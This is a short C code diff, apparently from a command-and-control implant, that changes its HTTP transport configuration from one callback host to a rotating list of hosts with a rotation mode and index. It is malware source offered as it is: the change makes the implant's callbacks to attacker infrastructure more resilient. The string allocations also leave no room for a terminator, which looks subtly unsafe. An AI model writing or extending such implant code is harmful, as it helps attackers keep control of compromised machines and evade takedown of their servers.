@@ -62,10 +62,22 @@ VOID ConfigInit()
 #ifdef TRANSPORT_HTTP
     Instance->Config.Transport.Method = L"POST";
 
-    Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Transport.Host = Instance->Win32.LocalAlloc( LPTR, ( Length * 2 ) + 2 );
-    Length = CharStringToWCharString( Instance->Config.Transport.Host, Buffer, Length );
-    PRINTF( "[CONFIG] Host: %ls [%d]\n", Instance->Config.Transport.Host, Length );
+    Instance->Config.Transport.HostRotation = ParserGetInt32( &Parser );
+
+    J = ParserGetInt32( &Parser );
+    Instance->Config.Transport.Hosts = Instance->Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
+    PRINTF( "[CONFIG] Hosts [%d]:\n", J );
+    for ( INT i = 0; i < J; i++ )
+    {
+        Buffer = ParserGetBytes( &Parser, &Length );
+        Instance->Config.Transport.Hosts[ i ] = Instance->Win32.LocalAlloc( LPTR, Length * 2 );
+        CharStringToWCharString( Instance->Config.Transport.Hosts[ i ], Buffer, Length );
+#ifdef DEBUG
+        printf( "  - %ls\n", Instance->Config.Transport.Hosts[ i ] );
+#endif
+    }
+    Instance->Config.Transport.Hosts[ J + 1 ] = NULL;
+    Instance->Config.Transport.HostIndex      = 0;
 
     // Listener Port
     Instance->Config.Transport.Port = ParserGetInt32( &Parser );
